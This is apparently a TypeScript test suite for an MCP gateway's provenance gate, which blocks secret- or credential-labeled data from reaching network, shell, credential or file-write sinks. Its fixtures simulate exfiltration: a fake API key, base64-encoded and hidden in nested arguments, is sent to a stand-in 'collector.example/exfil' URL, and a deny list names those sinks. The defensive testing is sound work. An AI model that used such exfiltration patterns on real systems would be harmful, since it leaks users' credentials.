/**
 * IF-07a provenance-preserving information-flow gate (provenance-policy.ts).
 *
 * Provenance tests (GATE-01..10) pin the gate semantics:
 *   - deny keys on propagated LABELS and value IDENTITY, never on value shape;
 *   - threading `GatewayRequest.inputProvenance` is the ONLY channel — no
 *     process-wide taint ledger exists (absent provenance, absent gate);
 *   - the deny matrix is explicit (secret/credential × network_send /
 *     credential_use / shell_exec / filesystem_write) and consent never
 *     downgrades it;
 *   - `renderTaintedObservation` no longer strips provenance fields.
 *
 * Claim ceiling: these tests prove explicit-provenance gating. They do NOT
 * prove automatic taint-through-transformation: a caller that drops the
 * provenance stays outside the gate, and operator profiles (IF-07b) remain
 * the independent structural fallback.
 */

import { describe, expect, it } from "bun:test";
import type { McpToolEntry } from "@wasmagent/mcp-server";
import { CapabilityRegistry } from "./capability.js";
import { buildServerCard, createRequestIdentity, MCPGateway } from "./gateway.js";
import { evaluatePolicy } from "./policy.js";
import {
  makeTaintProvenanceRules,
  PROVENANCE_DENY_SINKS,
  PROVENANCE_SENSITIVE_LABELS,
  TAINT_PROVENANCE_IDENTITY_RULE_ID,
  TAINT_PROVENANCE_LABEL_RULE_ID,
} from "./provenance-policy.js";
import {
  computeToolSnapshotHash,
  InMemoryToolSecurityProfileRegistry,
} from "./security-profile.js";
import { propagateTaint, renderTaintedObservation, taintObservation } from "./taint.js";

const SECRET = "sk-gate-test-secret-000123";
const EXFIL_URL = "https://collector.example/exfil";

const identity = createRequestIdentity({ principal: "gate-principal", sessionId: "gate-session" });

function tool(name: string, description: string): McpToolEntry {
  return { name, description, inputSchema: { type: "object" as const, properties: {} } };
}

function verifiedGateway(): MCPGateway {
  const card = buildServerCard({
    serverId: "srv",
    tools: [tool("search_docs", "search documents")],
    operatorVerified: true,
  });
  return new MCPGateway({ serverCards: [card] });
}

function hardenedGateway(): MCPGateway {
  return new MCPGateway();
}

const SECRET_NETWORK_ARGS = { destination: EXFIL_URL, token: SECRET };
const SEND_TOOL = tool("send_report", "send report");

describe("IF07A-GATE: provenance-preserving information-flow gate", () => {
  it("GATE-01: secret-labeled provenance threaded into a network sink → deny (label threading)", () => {
    const gw = verifiedGateway();
    const read = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("search_docs", "search documents"),
      args: { q: "config" },
    });
    const obs = gw.wrapResult("search_docs", `api_key=${SECRET}`, read, {
      taintLabels: ["secret"],
    });

    const send = hardenedGateway().evaluate({
      identity,
      serverId: "srv2",
      tool: SEND_TOOL,
      args: SECRET_NETWORK_ARGS,
      inputProvenance: [obs],
    });

    expect(send.invocation.decision).toBe("deny");
    expect(send.invocation.matchedPolicyIds).toContain(TAINT_PROVENANCE_LABEL_RULE_ID);
    expect(send.evidenceRef.inputTaintLabels).toEqual(["secret"]);
  });

  it("GATE-02: transformed value matched by content identity — placement and name irrelevant", () => {
    const gw = verifiedGateway();
    const read = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("search_docs", "search documents"),
      args: { q: "config" },
    });
    const secretResult = `api_key=${SECRET}`;
    const obs = gw.wrapResult("search_docs", secretResult, read, { taintLabels: ["secret"] });
    const transformed = Buffer.from(secretResult).toString("base64");
    const derived = propagateTaint(obs, "encode_step", transformed);

    // The base64 payload sits under a renamed, nested, array-buried key.
    const send = hardenedGateway().evaluate({
      identity,
      serverId: "srv2",
      tool: SEND_TOOL,
      args: {
        wrapper: { meta: { anything_else: ["x", transformed] } },
        destination: EXFIL_URL,
      },
      inputProvenance: [derived],
    });

    expect(send.invocation.decision).toBe("deny");
    // The value-shape deny cannot fire (base64 destroyed the sk- shape); the
    // identity deny proves the value is recognized by provenance alone.
    expect(send.invocation.matchedPolicyIds).toContain(TAINT_PROVENANCE_IDENTITY_RULE_ID);
    expect(send.invocation.matchedPolicyIds).toContain(TAINT_PROVENANCE_LABEL_RULE_ID);
  });

  it("GATE-03: no provenance threaded → gate absent (honest boundary, no ledger)", () => {
    const send = hardenedGateway().evaluate({
      identity,
      serverId: "srv2",
      tool: SEND_TOOL,
      args: { destination: EXFIL_URL, payload_b64: Buffer.from(SECRET).toString("base64") },
    });
    // Same call shape as the pre-gate IF-07a fixture: without threaded
    // provenance the gate does not fire (structural shape rules may still).
    expect(send.invocation.matchedPolicyIds).not.toContain(TAINT_PROVENANCE_LABEL_RULE_ID);
    expect(send.invocation.matchedPolicyIds).not.toContain(TAINT_PROVENANCE_IDENTITY_RULE_ID);
    expect(send.evidenceRef.inputTaintLabels).toBeUndefined();
  });

  it("GATE-04: benign labels and unlabeled provenance never trip the matrix", () => {
    const benignTool = taintObservation("search_docs", "plain report text", {
      trust: "untrusted",
      taintLabels: ["tool_supplied", "external_network"],
    });
    const unlabeled = taintObservation("search_docs", "more text", { trust: "untrusted" });

    for (const obs of [benignTool, unlabeled]) {
      const send = hardenedGateway().evaluate({
        identity,
        serverId: "srv2",
        tool: SEND_TOOL,
        // Plain values only: no secret-shaped text, so no OTHER structural
        // rule fires and the gate's silence is directly observable.
        args: { destination: EXFIL_URL, note: "hello" },
        inputProvenance: [obs],
      });
      expect(send.invocation.decision).toBe("allow");
      expect(send.invocation.matchedPolicyIds).not.toContain(TAINT_PROVENANCE_LABEL_RULE_ID);
      expect(send.invocation.matchedPolicyIds).not.toContain(TAINT_PROVENANCE_IDENTITY_RULE_ID);
    }
  });

  it("GATE-05: sensitive provenance into a non-dangerous sink does not deny", () => {
    const gw = verifiedGateway();
    const read = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("search_docs", "search documents"),
      args: { q: "config" },
    });
    const obs = gw.wrapResult("search_docs", `api_key=${SECRET}`, read, {
      taintLabels: ["secret"],
    });

    // A read-classified tool: sensitive provenance is threaded but the sink
    // is not dangerous, so the gate stays silent (no deny from our rules).
    const note = verifiedGateway().evaluate({
      identity,
      serverId: "srv",
      tool: tool("search_docs", "search documents"),
      args: { q: "summarize" },
      inputProvenance: [obs],
    });
    expect(note.invocation.matchedPolicyIds).not.toContain(TAINT_PROVENANCE_LABEL_RULE_ID);
    expect(note.invocation.matchedPolicyIds).not.toContain(TAINT_PROVENANCE_IDENTITY_RULE_ID);
    // Evidence still records the input provenance on allowed calls.
    expect(note.evidenceRef.inputTaintLabels).toEqual(["secret"]);
  });

  it("GATE-06: consent does not downgrade a provenance deny", () => {
    const gw = new MCPGateway();
    const snapshot = computeToolSnapshotHash(SEND_TOOL, "srv");
    gw.addConsentRecord({
      userIdHash: identity.principalHash,
      toolName: SEND_TOOL.name,
      toolSnapshotHash: snapshot,
    });

    const obs = taintObservation("vault_read", SECRET, { taintLabels: ["credential"] });
    const send = gw.evaluate({
      identity,
      serverId: "srv",
      tool: SEND_TOOL,
      args: SECRET_NETWORK_ARGS,
      inputProvenance: [obs],
    });
    expect(send.invocation.decision).toBe("deny");
    expect(send.invocation.matchedPolicyIds).toContain(TAINT_PROVENANCE_LABEL_RULE_ID);
  });

  it("GATE-07: renderTaintedObservation carries provenance through the render boundary", () => {
    const obs = taintObservation("vault_read", SECRET, { taintLabels: ["secret", "filesystem"] });
    const rendered = renderTaintedObservation(obs, SECRET);
    expect(rendered.taintLabels).toEqual(["secret", "filesystem"]);
    expect(rendered.contentHash).toBe(obs.contentHash);
    // Quarantine property unchanged.
    expect(rendered.content_b64).not.toContain("sk-");
    expect(Buffer.from(rendered.content_b64, "base64").toString("utf8")).toBe(SECRET);
  });

  it("GATE-08: wrapResult default mints no labels; explicit opts.mint labels", () => {
    const gw = verifiedGateway();
    const read = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("search_docs", "search documents"),
      args: { q: "x" },
    });
    expect(gw.wrapResult("search_docs", "text", read).taintLabels).toEqual([]);
    expect(
      gw.wrapResult("search_docs", "text", read, { taintLabels: ["secret"] }).taintLabels
    ).toEqual(["secret"]);
  });

  it("GATE-09: composeVerdict treats explicitly labeled observations as tainted", () => {
    const gw = verifiedGateway();
    const read = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("search_docs", "search documents"),
      args: { q: "x" },
    });
    // Heuristics see nothing; the label alone makes the observation tainted.
    const obs = gw.wrapResult("search_docs", "quietly ordinary text", read, {
      taintLabels: ["secret"],
    });
    expect(obs.instructionLikeTextDetected).toBe(false);
    const post = gw.wrapResultVerdict(obs, read);
    expect(post.taint).toBe("tainted");
  });

  it("GATE-10: profile-declared sinks are authoritative for the gate", () => {
    const registry = new InMemoryToolSecurityProfileRegistry();
    const capabilityRegistry = new CapabilityRegistry();
    // The tool LOOKS like a network sender by name, but the operator profile
    // declares only benign sinks — the gate must follow the profile.
    const misnamed = tool("send_report", "send report");
    registry.register({
      toolSnapshotHash: computeToolSnapshotHash(misnamed, "srv"),
      effects: ["read_only"],
      sinks: ["model_context", "external_tool"],
      capabilitiesRequired: [],
      sensitiveArgPaths: [],
    });

    const obs = taintObservation("vault_read", SECRET, { taintLabels: ["secret"] });
    const gw = new MCPGateway({ profileRegistry: registry, capabilityRegistry });
    const call = gw.evaluate({
      identity,
      serverId: "srv",
      tool: misnamed,
      args: SECRET_NETWORK_ARGS,
      inputProvenance: [obs],
    });
    expect(call.invocation.matchedPolicyIds).not.toContain(TAINT_PROVENANCE_LABEL_RULE_ID);
  });

  it("GATE-11: deny matrix is explicit and covers the documented pairs", () => {
    expect(PROVENANCE_SENSITIVE_LABELS).toEqual(["secret", "credential"]);
    expect(PROVENANCE_DENY_SINKS).toEqual([
      "network_send",
      "credential_use",
      "shell_exec",
      "filesystem_write",
    ]);

    // Rule-level matrix walk: every documented pair denies, near-misses don't.
    for (const sink of PROVENANCE_DENY_SINKS) {
      const [rule] = makeTaintProvenanceRules({
        provenance: [taintObservation("src", SECRET, { taintLabels: ["secret"] })],
        sinks: [sink],
      });
      expect(rule.evaluate("any", {}, null)).toBe("deny");
    }
    const benignSinks = makeTaintProvenanceRules({
      provenance: [taintObservation("src", SECRET, { taintLabels: ["secret"] })],
      sinks: ["model_context", "external_tool", "unknown"],
    });
    for (const rule of benignSinks) {
      expect(rule.evaluate("any", { token: SECRET }, null)).toBeUndefined();
    }
    // evaluatePolicy composition: deny lands in matchedPolicyIds with reasons.
    const decision = evaluatePolicy(
      "any_tool",
      { token: SECRET },
      null,
      [],
      [
        ...makeTaintProvenanceRules({
          provenance: [taintObservation("src", SECRET, { taintLabels: ["credential"] })],
          sinks: ["network_send"],
        }),
      ]
    );
    expect(decision.decision).toBe("deny");
    expect(decision.matchedPolicyIds).toContain(TAINT_PROVENANCE_LABEL_RULE_ID);
    expect(decision.matchedPolicyIds).toContain(TAINT_PROVENANCE_IDENTITY_RULE_ID);
  });
});
